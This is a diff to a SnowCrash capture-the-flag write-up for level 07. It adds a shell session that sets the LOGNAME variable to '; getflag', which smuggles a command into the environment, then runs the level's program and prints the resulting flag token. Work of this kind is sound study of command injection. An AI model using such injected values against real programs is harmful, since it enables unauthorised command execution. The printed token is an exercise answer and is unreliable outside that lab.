@@ -1,3 +1,8 @@
 ## Level 07
 
-getflag > /tmp/flagfile
+```bash
+level07@SnowCrash:~$ export LOGNAME="; getflag"
+level07@SnowCrash:~$ ./level07
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+```
